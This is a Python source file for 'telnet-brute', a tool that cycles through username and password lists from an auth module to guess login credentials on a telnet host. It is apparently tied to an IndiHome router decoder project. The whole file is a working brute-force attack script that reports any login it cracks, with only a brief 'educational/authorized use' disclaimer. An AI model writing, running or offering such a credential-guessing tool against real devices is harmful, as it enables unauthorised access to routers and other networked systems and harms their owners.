#!/usr/bin/env python

# Phyton build For: https://github.com/MichaelJorky/indihome-router-decoder/
# original (c) 2024 Dunia MR

### TELNET-BRUTE ###
# Uses a set of usernames & passwords from auth.py to obtain credentials to a telnet host.
# ade, 2024
#
# run without arguments to see usage
# Made for educational/authorized use.

VER = "1.0.0"

import os
import sys
import traceback
import re
import time
import getopt
import telnetlib

from auth import USERS, PASSWORDS

LOGIN_PROMPT = b"login:"
PWD_PROMPT = b"password:"

EXPECT_TIMEOUT = 775
# Increase this if the tool gives false negatives.
# It might give up on waiting for response too early!
# Increasing will make it slower though so max 2000 probably.


# convert string to bytes, write to telnet, return byte length back
def t_write(telnet, string):
	try:
		buf = string.encode("ascii")
		telnet.write(buf)
		return len(buf)
	except:
		return 0

def str_lastline(buf, dbg = False):
	string = buf
	if isinstance(buf, bytes):
		string = buf.decode()
	
	if dbg:
		print(string)
	lns = string.splitlines()
	lastNonNewline = ""
	for l in lns:
		if not re.match(r"\r?\n", l):
			lastNonNewline = l

	return lastNonNewline

class AutoTelnet:
	def __init__(self, host, lp, pp):
		self.host = host
		self.telnet = None
		self.L_prompt = lp
		self.P_prompt = pp
		self.correct = {
			"user": None,
			"pwd": None
		}
		
	def conn(self):
		self.telnet = telnetlib.Telnet()
		self.telnet.open(self.host)

	def brute(self, verbose):
		usersLen = len(USERS)
		
		for uIdx, user in enumerate(USERS): # loop all usernames
			self.conn()
			
			n, match, txt = self.telnet.expect([rb"(\w* )?login:( ?)"], EXPECT_TIMEOUT / 1000)

			if not self.L_prompt.decode() in str_lastline(txt).lower():
				print(f"[err] Failed to receive expected login prompt from host.")
				print(f"[err] Expected: \"{self.L_prompt.decode()}\"")
				print(f"[err] Got: \"{txt.decode()}\"")
				print(f"[err] Note: the host being slow can also cause this.")
				sys.exit(0)

			if self.L_prompt.decode() in str_lastline(txt).lower():
				try:
					t_write(self.telnet, user + "\n")

					n, match, txt = self.telnet.expect([rb"(\w* )?login:( ?)"], EXPECT_TIMEOUT / 1000)
					if self.P_prompt.decode() in str_lastline(txt).lower():
						if verbose:
							print(f"| [V]   {user} ({str(uIdx + 1)}/{str(usersLen)})")
						self.telnet.close()

						pwdsLen = len(PASSWORDS)

						for pIdx, pwd in enumerate(PASSWORDS): # loop all passwords
							self.conn()
							
							n, match, txt = self.telnet.expect([rb"(\w* )?login:( ?)"], EXPECT_TIMEOUT / 1000)
							
							if not self.L_prompt.decode() in str_lastline(txt).lower():
								print(f"[err] Failed to receive expected login prompt from host.")
								print(f"[err] Expected: \"{self.L_prompt.decode()}\"")
								print(f"[err] Got: \"{txt.decode()}\"")
								print(f"[err] Note: the host being slow can also cause this.")
								sys.exit(0)

							if self.L_prompt.decode() in str_lastline(txt).lower():
								try:
									t_write(self.telnet, user + "\n")
									time.sleep(.1)
									t_write(self.telnet, pwd + "\n")
									
									n, match, txt = self.telnet.expect([rb"(\w* )?password:( ?)"], EXPECT_TIMEOUT / 1000)
									lastl = str_lastline(txt).lower()
									if (not self.P_prompt.decode() in lastl.lower() and not "incorrect" in lastl) or "welcome" in lastl:
										if verbose:
											print(f"| [V]         {pwd} ({str(pIdx + 1)}/{str(pwdsLen)})")

										self.correct["user"] = user
										self.correct["pwd"] = pwd

										return True
									else:
										if verbose:
											print(f"| [X]         {pwd} ({str(pIdx + 1)}/{str(pwdsLen)})")
										continue
								
								except KeyboardInterrupt:
									sys.exit(0)
								except SystemExit as e:
									sys.exit(e)
								except ConnectionError:
									print(f"[err] Failed to connect to host.")
								except:
									print("[brute] Exception occurred")
									traceback.print_exc()
									sys.exit(0)
					else:
						if verbose:
							print(f"| [X]   {user} ({str(uIdx + 1)}/{str(usersLen)})")
							
						continue
									
				except KeyboardInterrupt:
					sys.exit(0)
				except SystemExit as e:
					sys.exit(e)
				except ConnectionError:
					print(f"[err] Failed to connect to host.")
				except:
					print("[brute] Exception occurred")
					traceback.print_exc()
					sys.exit(0)

		# exhausted!
		self.telnet.close()
		return False


def main():
	basename = os.path.splitext(os.path.basename(sys.argv[0]))[0]

	usage = f"""telnet-brute v{VER}
	
usage:	{basename} <host>
	[-v] Display each attempt

Example: {basename}.py 127.0.0.1

made by: ade (2021)
inspiration: dtrinf (2016)

WARNING: Made for educational/authorized use."""
	if len(sys.argv) <= 1:
		print(usage)
		sys.exit(1)

	opts = getopt.getopt(sys.argv[2:], "v")

	lgp = LOGIN_PROMPT
	pwdp = PWD_PROMPT
	verb = False

	if len(opts[0]) > 0:
		for (opt, optarg) in opts[0]:
			if opt == "-v":
				verb = True

	host = sys.argv[1]
	autoTelnet = AutoTelnet(host, lgp, pwdp)
	print(f"[init] Host: {host}")
	print(f"[init] Bruting...\n")
	result = autoTelnet.brute(verb)
	
	print("")
	if result: # creds found
		print(f"[end] Working login found!\nuser: \"{autoTelnet.correct['user']}\"\npwd: \"{autoTelnet.correct['pwd']}\"")
	else:
		print(f"[end] No credentials found.")

	return 0

try:
	main()
except KeyboardInterrupt:
	sys.exit(0)
except ConnectionError:
	print(f"[err] Failed to connect to host.")
except SystemExit as e:
	sys.exit(e)
except Exception:
	print(f"[exc] Exception occurred.\n")
	traceback.print_exc()
	sys.exit(0)
